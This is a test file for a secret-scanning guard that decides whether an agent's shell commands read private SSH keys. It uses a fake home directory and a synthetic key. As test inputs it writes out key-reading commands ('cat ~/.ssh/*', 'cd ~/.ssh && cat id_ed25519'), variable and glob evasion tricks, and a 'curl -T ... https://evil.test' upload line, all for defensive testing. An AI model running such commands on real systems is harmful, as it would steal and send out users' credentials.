import { describe, it, expect, afterAll } from 'vitest';
/**
 * Two defects the SOAK found, not inspection.
 *
 * 1. FALSE POSITIVE (blocked real work). Log line 2026-09-18T12:54:55Z:
 *      cd <project> && cat > /tmp/jev-evasion.mjs <<'EOF' … EOF
 *    blocked as `secret-content: pem-private-key:~/.ssh/id_ed25519`. That
 *    command WROTE a file. It never read the key — the heredoc body being
 *    written merely mentioned the path in a string. Under enforce this refuses
 *    writing any test, doc or script that NAMES a key path.
 *
 * 2. FALSE NEGATIVE (missed the real thing). `cd ~/.ssh && cat id_ed25519`
 *    was not caught, because `id_ed25519` contains no slash and so was never
 *    considered a path at all. The plainest possible read of the real key.
 *
 * SAFETY: nothing here opens a real credential. Tests that must exercise `~`,
 * `$HOME` or a glob over a `.ssh` directory are pointed at a FAKE home under
 * tmpdir, seeded with a synthetic PEM. Earlier versions read the developer's
 * own `~/.ssh/id_ed25519` when it happened to exist — guarded and asserting
 * only booleans, but still loading private-key bytes into the memory of a unit
 * test run, and silently skipping on machines without one. A fixture proves
 * the same behaviour on every machine and reads nobody's key.
 *
 * Every credential-shaped fixture is ASSEMBLED AT RUNTIME — written as literals
 * they are correctly refused by AGNT's NOPE rules.
 */

import { mkdtempSync, mkdirSync, writeFileSync, chmodSync, rmSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import {
  extractPaths,
  scanForSecrets,
  stripHeredocBodies,
  commandSegments,
  collectAssignments,
  derefToken,
  globToRegExp,
  expandGlob,
  MAX_GLOB_MATCHES,
} from './secretScan.js';
import { decide } from './decide.js';
import { loadSpec } from './assess.js';

describe('secretScan — what a command can actually reach', () => {

  const T = loadSpec().thresholds;

  const DASHES = "-".repeat(5);
  const FAKE_PEM = `${DASHES}BEGIN OPENSSH PRIVATE ${"KEY"}${DASHES}\nAAAA${"b".repeat(40)}\n${DASHES}END OPENSSH PRIVATE ${"KEY"}${DASHES}\n`;

  /**
   * A fake home, so `~`, `$HOME` and `.ssh` globs can be exercised without
   * opening the developer's own key. It holds id_ed25519 and NOT id_rsa, which
   * makes both the present case and the phantom case deterministic on every
   * machine — the previous version asserted `~/.ssh/id_rsa` was absent, which
   * is simply false for anyone who still has an RSA key.
   */
  const fakeHome = mkdtempSync(join(tmpdir(), "jev-home-"));
  mkdirSync(join(fakeHome, ".ssh"), { mode: 0o700 });
  const HOME = { home: fakeHome };
  const FAKE_KEY = join(fakeHome, ".ssh", "id_ed25519");
  const PHANTOM_KEY = join(fakeHome, ".ssh", "id_rsa"); // never created
  writeFileSync(FAKE_KEY, FAKE_PEM);
  chmodSync(FAKE_KEY, 0o600);

  const dir = mkdtempSync(join(tmpdir(), "jev-reach-"));
  const write = (name, body, mode = 0o600) => {
    const f = join(dir, name);
    writeFileSync(f, body);
    chmodSync(f, mode);
    return f;
  };

  const answers = (choice, { exfil = 0, asked = 0, jail = 0, conf = 1 } = {}) => ({
    reversibility: { type: "choice", choice, confidence: conf },
    exfiltrates_secrets: { noul: exfil },
    user_explicitly_asked: { noul: asked },
    jailbreak_or_override: { noul: jail },
  });

  /* ── 1. heredoc bodies are written content, not paths read ────────────── */

  it("stripHeredocBodies drops the body and keeps the opener", () => {
    const cmd = [
      "cat > /tmp/out.mjs <<'EOF'",
      "const K = '/Users/tom/.ssh/id_ed25519';",
      "EOF",
      "node /tmp/out.mjs",
    ].join("\n");
    const stripped = stripHeredocBodies(cmd);
    expect(stripped.includes("/tmp/out.mjs"), "the write target is a real path").toBeTruthy();
    expect(!stripped.includes("id_ed25519"), "the body must not survive").toBeTruthy();
    expect(stripped.includes("node /tmp/out.mjs"), "code after the body survives").toBeTruthy();
  });

  it("handles unquoted, quoted and dash forms, and several bodies", () => {
    for (const open of ["<<EOF", "<<'EOF'", '<<"EOF"', "<<-EOF"]) {
      const cmd = `cat > /tmp/a ${open}\n/Users/tom/.ssh/id_ed25519\nEOF\necho done`;
      const out = stripHeredocBodies(cmd);
      expect(!out.includes("id_ed25519"), open).toBeTruthy();
      expect(out.includes("echo done"), open).toBeTruthy();
    }
    const two = "cat > /tmp/a <<'E1'\n/secret/one\nE1\ncat > /tmp/b <<'E2'\n/secret/two\nE2\n";
    const out = stripHeredocBodies(two);
    expect(!out.includes("/secret/one") && !out.includes("/secret/two")).toBeTruthy();
    expect(out.includes("/tmp/a") && out.includes("/tmp/b")).toBeTruthy();
  });

  it("a command with no heredoc is returned untouched", () => {
    const cmd = "cat /Users/tom/.ssh/id_ed25519";
    expect(stripHeredocBodies(cmd)).toBe(cmd);
  });

  it("a herestring is not treated as a heredoc", () => {
    // `<<<` cannot open a body; stripping it would delete real following code.
    const cmd = "grep x <<< /Users/tom/.ssh/id_ed25519\necho after";
    expect(stripHeredocBodies(cmd).includes("echo after")).toBeTruthy();
  });

  it("REGRESSION: a herestring whose operand is a BARE WORD is still not a heredoc", () => {
    // The test above passed for the wrong reason. `<<` also matches at the
    // second and third brackets of `<<<`, leaving ` foo` — a heredoc named
    // `foo`, swallowing every line until one says `foo`. It stayed hidden
    // because the operand there starts with `/`, which cannot begin a
    // terminator name. A bare word is the case that exposes it.
    const cmd = "grep x <<< foo\necho after";
    const out = stripHeredocBodies(cmd);
    expect(out, "the following line must survive").toContain("echo after");
    expect(out, "and the herestring itself must not be mangled").toContain("<<< foo");
  });

  it("REGRESSION: the heredoc OPENER token is not left behind as a filename", () => {
    // `<<EOF` survived tokenisation as the bare word `EOF`. With a cd in
    // effect, a file actually named EOF in that directory would then be
    // scanned as though the command had read it.
    const out = stripHeredocBodies("cd /tmp && cat > out.txt <<EOF\nbody\nEOF");
    expect(out, "the terminator name must not remain").not.toContain("EOF");
    expect(out, "but the real write target must").toContain("out.txt");
  });

  it("a file literally named EOF is not scanned because of the heredoc", () => {
    // The end-to-end form of the above, with the trap actually laid.
    const sub = mkdtempSync(join(dir, "heredoc-"));
    writeFileSync(join(sub, "EOF"), FAKE_PEM);
    chmodSync(join(sub, "EOF"), 0o600);

    const e = scanForSecrets({ command: `cd ${sub} && cat > out.txt <<EOF\nbody\nEOF` });
    expect(e.hasRealSecret, "the terminator is not a file being read").toBe(false);
  });

  it("<<-EOF still opens a heredoc, and its body is still dropped", () => {
    const out = stripHeredocBodies(`cat <<-EOF\n${FAKE_KEY}\nEOF\necho after`);
    expect(out).not.toContain("id_ed25519");
    expect(out).toContain("echo after");
  });

  it("ACCEPTANCE: writing a script that MENTIONS a key path is not a secret read", () => {
    const key = write("id_ed25519_sim", FAKE_PEM);
    const cmd = [
      `cd ${dir} && cat > ${join(dir, "probe.mjs")} <<'EOF'`,
      `const K = '${key}';`,
      "console.log(K);",
      "EOF",
    ].join("\n");

    const e = scanForSecrets({ command: cmd });
    expect(e.hasRealSecret, "the body is content being written, not a path read").toBe(false);
    expect(decide(answers("reversible", { asked: 0.95 }), T, e).action !== "block").toBe(true);
  });

  it("but READING that same file is still caught", () => {
    const key = write("id_ed25519_sim2", FAKE_PEM);
    const e = scanForSecrets({ command: `cat ${key}` });
    expect(e.hasRealSecret).toBe(true);
    expect(decide(answers("read_only", { exfil: 0.02 }), T, e).action).toBe("block");
  });

  it("content/code args are never path-scanned", () => {
    const key = write("id_ed25519_sim3", FAKE_PEM);
    const e = scanForSecrets({
      operation: "write",
      path: join(dir, "notes.txt"),
      content: `see ${key} for the key`,
      code: `const k = '${key}';`,
    });
    expect(e.hasRealSecret, "written content must not be read as paths").toBe(false);
  });

  /* ── 2. cd tracking, so a bare filename is a path ──────────────────────── */

  it("commandSegments splits on every command-position separator", () => {
    expect(commandSegments("cd /a && cat b; ls c | wc").map((s) => s.trim())).toEqual(["cd /a", "cat b", "ls c", "wc"]);
  });

  it("ACCEPTANCE: `cd <dir> && cat <bare>` resolves the bare filename", () => {
    const key = write("id_ed25519_sim4", FAKE_PEM);
    const e = scanForSecrets({ command: `cd ${dir} && cat ${key.split("/").pop()}` });
    expect(e.hasRealSecret, "the bare filename must resolve against the cd").toBe(true);
    expect(decide(answers("read_only", { exfil: 0.02 }), T, e).action).toBe("block");
  });

  it("REGRESSION: a key under ~/.ssh, via cd + bare name", () => {
    // The exact shape that was missed in the soak. Against a FIXTURE home, so
    // it asserts the same thing on a machine with no ~/.ssh at all — the
    // previous version returned early there and quietly proved nothing.
    const e = scanForSecrets({ command: "cd ~/.ssh && cat id_ed25519" }, HOME);
    expect(e.hasRealSecret, "cd ~/.ssh && cat id_ed25519 must be caught").toBe(true);
  });

  it("a bare token that is not a file is not counted as a path", () => {
    // Otherwise every subcommand and flag is stat'd, and each miss pollutes
    // allAbsent — the signal the phantom downgrade reads. `run`, `build` and
    // `--silent` must all be ignored.
    const e = scanForSecrets({ command: `cd ${dir} && npm run build --silent` });
    expect(e.scanned, "nothing here is a file being touched").toBe(0);
    expect(e.hasRealSecret).toBe(false);
    expect(e.allAbsent, "no paths at all is not 'all absent'").toBe(false);
  });

  it("the cd target itself is not scanned as a file", () => {
    // It is a directory by definition: never secret content, and counting it
    // would pad both `scanned` and the allAbsent denominator with noise.
    const e = scanForSecrets({ command: `cd ${dir}` });
    expect(e.scanned).toBe(0);
    expect(e.allAbsent).toBe(false);
  });

  it("cd is tracked across several segments and can be re-targeted", () => {
    const sub = mkdtempSync(join(dir, "sub-"));
    const key = write("id_ed25519_sim5", FAKE_PEM);
    writeFileSync(join(sub, "plain.txt"), "nothing");

    const e = scanForSecrets({ command: `cd ${sub} && cat plain.txt && cd ${dir} && cat ${key.split("/").pop()}` });
    expect(e.hasRealSecret, "the SECOND cd must take effect").toBe(true);
  });

  it("a bare `cd` resets to home, it does not keep the previous directory", () => {
    // Found by a mutation surviving: nothing covered `cd` with no argument, so
    // a change that left the old cwd in place went unnoticed.
    const key = write("id_ed25519_sim6", FAKE_PEM);
    const bare = key.split("/").pop();
    const stillThere = scanForSecrets({ command: `cd ${dir} && cat ${bare}` });
    expect(stillThere.hasRealSecret, "precondition: resolves while cd is active").toBe(true);

    const afterReset = scanForSecrets({ command: `cd ${dir} && cd && cat ${bare}` });
    expect(afterReset.hasRealSecret, "after a bare cd the old directory must not still resolve bare names").toBe(false);
  });

  it("a relative path with a slash still resolves without any cd", () => {
    // Pre-existing behaviour the spelling matrix depends on.
    expect(extractPaths({ command: "cat fixtures/jev-sim.env" }).length > 0).toBeTruthy();
  });

  it("cd does not leak into an unrelated later command with no cd", () => {
    const e = scanForSecrets({ command: `cat ${join(dir, "nope-missing")}` });
    expect(e.allAbsent).toBe(true);
    expect(e.hasRealSecret).toBe(false);
  });

  /* ── 3. variable indirection ───────────────────────────────────────────── */

  it("ACCEPTANCE: `K=<key>; cat $K` resolves through the variable", () => {
    const key = write("id_ed25519_var", FAKE_PEM);
    const e = scanForSecrets({ command: `K=${key}; cat $K` });
    expect(e.hasRealSecret, "indirection through a variable must resolve").toBe(true);
    expect(decide(answers("read_only", { exfil: 0.02 }), T, e).action).toBe("block");
  });

  it("ACCEPTANCE: an exported and quoted variable resolves too", () => {
    const key = write("id_ed25519_var2", FAKE_PEM);
    for (const cmd of [
      `export K=${key} && cat "$K"`,
      `K=${key} && cat \${K}`,
      `K='${key}'; base64 $K`,
    ]) {
      expect(scanForSecrets({ command: cmd }).hasRealSecret, cmd).toBe(true);
    }
  });

  it("an assignment on its own reads nothing, and pollutes nothing", () => {
    // The old code stat'd the whole `K=/path` token: a guaranteed miss that was
    // then counted as an ABSENT path, which is the signal the phantom downgrade
    // reads. Both halves of that were wrong.
    const key = write("id_ed25519_var3", FAKE_PEM);
    const e = scanForSecrets({ command: `K=${key}` });
    expect(e.hasRealSecret, "assigning a path does not read it").toBe(false);
    expect(e.scanned, "the assignment token is not a path candidate").toBe(0);
    expect(e.allAbsent, "and must not fake the phantom signal").toBe(false);
  });

  it("an unknown variable is left alone rather than invented", () => {
    const e = scanForSecrets({ command: "cat $NOT_ASSIGNED_ANYWHERE" });
    expect(e.scanned).toBe(0);
    expect(e.hasRealSecret).toBe(false);
  });

  it("$HOME still expands, because it is not a tracked assignment", () => {
    expect(
      scanForSecrets({ command: "cat $HOME/.ssh/id_ed25519" }, HOME).hasRealSecret,
    ).toBe(true);
  });

  /**
   * Mirrors the `hop < N` bound in derefToken. The cycle tests below assert
   * against this EXACTLY, so changing the implementation's cap fails them with a
   * message naming this constant — rather than looking like a fresh bug.
   */
  const HOP_CAP = 3;

  it("a self-referential variable terminates instead of spinning", () => {
    // Caught by the EQUALITY check, not the hop cap — see the next test.
    const vars = collectAssignments("K=$K");
    expect(derefToken("$K", vars)).toBe("$K");
    expect(scanForSecrets({ command: "K=$K; cat $K" }).hasRealSecret).toBe(false);
  });

  it("the hop cap bounds resolution, which a MUTUAL pair depends on", () => {
    // A mutation removing the cap SURVIVED the self-reference test above,
    // because equality already handled that case. Only `A=$B; B=$A` needs the
    // cap — it alternates forever.
    //
    // The chain assertion comes FIRST deliberately: it pins the bound exactly
    // and fails fast, so a build with an unbounded loop dies here instead of
    // hanging on the mutual pair below.
    // This is also the only guard on the cap being too SMALL: a cap of 1 or 2
    // leaves this chain short of $D. The cycle test above cannot see that — it
    // measures cost, and a smaller cap costs less.
    const chain = collectAssignments("A=$B; B=$C; C=$D; D=/tmp/real");
    expect(derefToken("$A", chain), `a chain deeper than HOP_CAP (${HOP_CAP}) must stay unresolved, not resolve`).toBe("$D");

    // Guarded rather than trusted to ordering. The chain assertion above does
    // fail first today, but that is a property of argument evaluation order,
    // not something this file enforces — and relying on it is the same
    // fragility this whole cluster of tests exists to remove.
    expect(derefTerminates(), "derefToken is unbounded — this would hang").toBe(true);

    const mutual = collectAssignments("A=$B; B=$A");
    expect(derefToken("$A", mutual), "a mutual pair must terminate").toBe("$B");
  });

  it("MUTUAL CYCLE: `A=$B; B=$A` terminates, proven by a fuse rather than by waiting", () => {
    // The test above only kills a cap-removing mutation BY ORDERING: its chain
    // assertion happens to fail first, so the mutual case never runs. That is
    // luck, not a lock — reorder the file and the cycle is unguarded again.
    //
    // It cannot be fixed with a test timeout either: derefToken is SYNCHRONOUS,
    // so a spin blocks the event loop and node:test's timer never fires. The
    // suite would hang, not fail, and a hang in CI reads as infrastructure
    // trouble rather than a bug.
    //
    // So the cycle is made observable instead. derefToken touches `vars` only
    // through has()/get(), so a duck-typed stand-in can count lookups and THROW
    // once the count is impossible for a correctly bounded implementation. An
    // unbounded build fails here in microseconds with an explanatory message.
    // TWO MECHANISMS, WITH DIFFERENT JOBS — measured, not assumed:
    //
    //   the lookup assertion  catches every BOUNDED deviation (cap 1,2,4,5…32)
    //   the fuse              catches NON-TERMINATION, which no assertion can
    //                         reach because the call never returns
    //
    // The fuse's exact value is arbitrary within a wide band: far enough above
    // HOP_CAP that a correct build never reaches it, low enough that a runaway
    // build fails in microseconds instead of hanging CI.
    const FUSE = HOP_CAP * 10;
    const pair = new Map([
      ["A", "$B"],
      ["B", "$A"],
    ]);
    let lookups = 0;
    const fused = {
      has(name) {
        lookups += 1;
        if (lookups > FUSE) {
          throw new Error(
            `derefToken made more than ${FUSE} lookups resolving a 2-cycle. The hop ` +
              `cap is missing or far too large, and on a real cycle this would not terminate.`,
          );
        }
        return pair.has(name);
      },
      get: (name) => pair.get(name),
    };

    const out = derefToken("$A", fused);

    // EXACT, not an upper bound. An earlier `lookups <= 4` let a cap of 4 slip
    // past this assertion — it was then caught only by the RETURNED VALUE, which
    // alternates $B/$A with the cap's parity. Relying on parity is luck; this
    // pins the bound itself, and a legitimate cap change updates HOP_CAP.
    expect(lookups, `an unresolvable 2-cycle must cost exactly HOP_CAP (${HOP_CAP}) lookups, not ${lookups}. ` +
        `If derefToken's cap changed on purpose, update HOP_CAP in this file.`).toBe(HOP_CAP);
    // Intent rather than a second detector: a cycle yields an UNRESOLVED token,
    // so nothing downstream mistakes it for a path to stat.
    expect(out.startsWith("$"), `a cycle must not resolve to a path, got ${out}`).toBeTruthy();
  });

  it("a longer cycle is bounded too, not just the 2-element case", () => {
    // Same precondition as the end-to-end test below, and for the same reason:
    // this uses a REAL map, so an unbounded build spins here forever instead
    // of failing. A 3-cycle is the case that needs it most — it never repeats
    // the previous value, so the equality guard cannot see it either.
    expect(derefTerminates(), "derefToken is unbounded — this would hang").toBe(true);

    // A 3-cycle hops A->B->C->A and never repeats the PREVIOUS value, so the
    // `next === t` equality check cannot see it either. Only the cap stops it.
    // With HOP_CAP hops this lands back on its own start.
    const vars = collectAssignments("A=$B; B=$C; C=$A");
    expect(derefToken("$A", vars), "a 3-cycle returns to its start, unresolved").toBe("$A");
  });

  /**
   * Does derefToken terminate on a 2-cycle? Answered by injection, cheaply.
   *
   * Exists so the end-to-end test below can ask the question WITHOUT running
   * the un-interruptible call that would answer it by hanging.
   */
  function derefTerminates() {
    const pair = new Map([["A", "$B"], ["B", "$A"]]);
    let lookups = 0;
    const fused = {
      has(name) {
        lookups += 1;
        if (lookups > HOP_CAP * 10) throw new Error("unbounded");
        return pair.has(name);
      },
      get: (name) => pair.get(name),
    };
    try {
      derefToken("$A", fused);
      return true;
    } catch {
      return false;
    }
  }

  it("a cycle in a real command neither resolves nor hangs the scan", () => {
    // PRECONDITION, and it is load-bearing rather than defensive noise.
    //
    // scanForSecrets builds its own variable map internally, so unlike the
    // fuse test above there is nowhere to inject a counter. If the hop cap
    // were removed, the call below would spin forever: synchronous, so no test
    // timeout can interrupt it, and the suite would HANG instead of failing.
    // A stall reads as broken infrastructure; a failure reads as a bug. Ask
    // the bounded question first and bail with a clear message.
    //
    // Found by mutation: removing the cap turned this file from "fails in
    // 115ms" into "never returns".
    expect(
      derefTerminates(),
      "derefToken is unbounded — refusing to run the end-to-end cycle, which would hang rather than fail",
    ).toBe(true);

    // End to end: extractPaths -> derefToken. A cycle must yield no evidence
    // rather than stalling the tool path it sits in front of.
    const e = scanForSecrets({ command: "A=$B; B=$A; cat $A" });
    expect(e.hasRealSecret).toBe(false);
    expect(e.scanned, "an unresolved token is not a path candidate").toBe(0);
    expect(e.allAbsent, "and must not fake the phantom signal").toBe(false);
  });

  it("a variable can carry the cd target", () => {
    const key = write("id_ed25519_var4", FAKE_PEM);
    const e = scanForSecrets({ command: `D=${dir}; cd $D && cat ${key.split("/").pop()}` });
    expect(e.hasRealSecret).toBe(true);
  });

  /* ── 4. globs ──────────────────────────────────────────────────────────── */

  it("globToRegExp anchors, and never crosses a separator", () => {
    expect(globToRegExp("*").test("id_ed25519")).toBeTruthy();
    expect(!globToRegExp("*").test("sub/id_ed25519"), "* must not cross /").toBeTruthy();
    expect(globToRegExp("id_*").test("id_rsa")).toBeTruthy();
    expect(!globToRegExp("id_*").test("notid_rsa"), "anchored at the start").toBeTruthy();
    expect(globToRegExp("id_?sa").test("id_rsa")).toBeTruthy();
    expect(!globToRegExp("id_?sa").test("id_rrsa")).toBeTruthy();
    expect(globToRegExp("key[12]").test("key2")).toBeTruthy();
    expect(!globToRegExp("key[12]").test("key3")).toBeTruthy();
    expect(globToRegExp("a.b").test("a.b")).toBeTruthy();
    expect(!globToRegExp("a.b").test("axb"), "a literal dot is not a wildcard").toBeTruthy();
  });

  it("ACCEPTANCE: `cat <dir>/*` sees the key it would read", () => {
    const sub = mkdtempSync(join(dir, "glob-"));
    writeFileSync(join(sub, "id_ed25519"), FAKE_PEM);
    chmodSync(join(sub, "id_ed25519"), 0o600);
    writeFileSync(join(sub, "known_hosts"), "nothing secret");

    const e = scanForSecrets({ command: `cat ${sub}/*` });
    expect(e.hasRealSecret, "a glob reads every match, so it must expand").toBe(true);
    expect(e.scanned, "both entries are candidates").toBe(2);
    expect(decide(answers("read_only", { exfil: 0.02 }), T, e).action).toBe("block");
  });

  it("a partial glob expands the same way", () => {
    const sub = mkdtempSync(join(dir, "glob2-"));
    writeFileSync(join(sub, "id_ed25519"), FAKE_PEM);
    chmodSync(join(sub, "id_ed25519"), 0o600);
    expect(scanForSecrets({ command: `cat ${sub}/id_*` }).hasRealSecret).toBe(true);
  });

  it("a glob that matches nothing is not an absent path", () => {
    const sub = mkdtempSync(join(dir, "glob3-"));
    writeFileSync(join(sub, "notes.txt"), "nothing");
    const e = scanForSecrets({ command: `cat ${sub}/*.pem` });
    expect(e.scanned).toBe(0);
    expect(e.allAbsent, "no matches is not 'every path is missing'").toBe(false);
  });

  it("* does not match a dotfile unless the pattern starts with one", () => {
    // Shell semantics. Matching them would make `cat *` in a home directory
    // enumerate every dot-config on the machine.
    const sub = mkdtempSync(join(dir, "glob4-"));
    writeFileSync(join(sub, ".hidden_key"), FAKE_PEM);
    chmodSync(join(sub, ".hidden_key"), 0o600);

    expect(scanForSecrets({ command: `cat ${sub}/*` }).scanned, "* skips dotfiles").toBe(0);
    expect(scanForSecrets({ command: `cat ${sub}/.*` }).hasRealSecret, ".* finds them").toBe(true);
  });

  it("a glob in the DIRECTORY part expands to nothing rather than guessing", () => {
    // Behaviour, not mechanism: the directory read fails, so there is nothing to
    // report. The explicit guard that used to sit in front of this was removed —
    // no mutation could kill it, because this is what already happens.
    const sub = mkdtempSync(join(dir, "glob5-"));
    writeFileSync(join(sub, "id_ed25519"), FAKE_PEM);
    expect(expandGlob(`${dir}/glob*/id_ed25519`)).toEqual([]);
    expect(scanForSecrets({ command: `cat ${dir}/glob*/id_ed25519` }).hasRealSecret).toBe(false);
  });

  it("expansion is capped, so a glob in a huge directory cannot stall a tool", () => {
    const sub = mkdtempSync(join(dir, "glob6-"));
    for (let i = 0; i < MAX_GLOB_MATCHES + 12; i += 1) writeFileSync(join(sub, `f${i}.txt`), "x");
    expect(expandGlob(`${sub}/*`).length).toBe(MAX_GLOB_MATCHES);
  });

  it("an unreadable or missing directory yields no evidence, not a throw", () => {
    expect(expandGlob(`${dir}/does-not-exist/*`)).toEqual([]);
  });

  it("REGRESSION: a key directory via a glob", () => {
    // `cat ~/.ssh/*` was MISSED entirely. Fixture home, so this holds anywhere.
    expect(scanForSecrets({ command: "cat ~/.ssh/*" }, HOME).hasRealSecret).toBe(true);
  });

  /* ── 5. naming a path is not reading it ──────────────────────────────── */

  it("ACCEPTANCE: echoing a key PATH is not reading the key", () => {
    // Found while re-probing the fixed shapes. Same class as the heredoc
    // defect: under enforce this refused merely talking about a path.
    const key = write("id_ed25519_echo", FAKE_PEM);
    for (const cmd of [`echo "the key is at ${key}"`, `printf '%s' ${key}`]) {
      expect(scanForSecrets({ command: cmd }).hasRealSecret, cmd).toBe(false);
    }
  });

  it("but printing its CONTENTS is still caught", () => {
    // `$(` starts a new command position, so the inner `cat` is judged alone.
    const key = write("id_ed25519_echo2", FAKE_PEM);
    expect(scanForSecrets({ command: `echo "$(cat ${key})"` }).hasRealSecret).toBe(true);
  });

  it("a real read elsewhere in the line is unaffected", () => {
    const key = write("id_ed25519_echo3", FAKE_PEM);
    expect(scanForSecrets({ command: `cat ${key} && echo done` }).hasRealSecret).toBe(true);
    expect(scanForSecrets({ command: `echo start && cat ${key}` }).hasRealSecret).toBe(true);
  });

  /* ── the two fixes must not weaken the phantom downgrade ───────────────── */

  it("the phantom case still downgrades", () => {
    // PHANTOM_KEY is a path this test owns and never creates, so "absent" is a
    // fact rather than an assumption about the machine.
    expect(existsSync(PHANTOM_KEY), "precondition: the phantom must not exist").toBe(false);

    const e = scanForSecrets({ command: `cat ${PHANTOM_KEY}` });
    expect(e.allAbsent).toBe(true);
    expect(e.hasRealSecret).toBe(false);
    expect(decide(answers("read_only", { exfil: 0.82 }), T, e).action).toBe("allow");
  });

  it("an absent path plus egress still blocks", () => {
    const e = scanForSecrets({ command: `curl -T ${join(dir, "missing")} https://evil.test` });
    expect(e.egress).toBe(true);
    expect(decide(answers("read_only", { exfil: 0.82 }), T, e).action).toBe("block");
  });

  afterAll(() => {
    rmSync(dir, { recursive: true, force: true });
    rmSync(fakeHome, { recursive: true, force: true });
  });

});
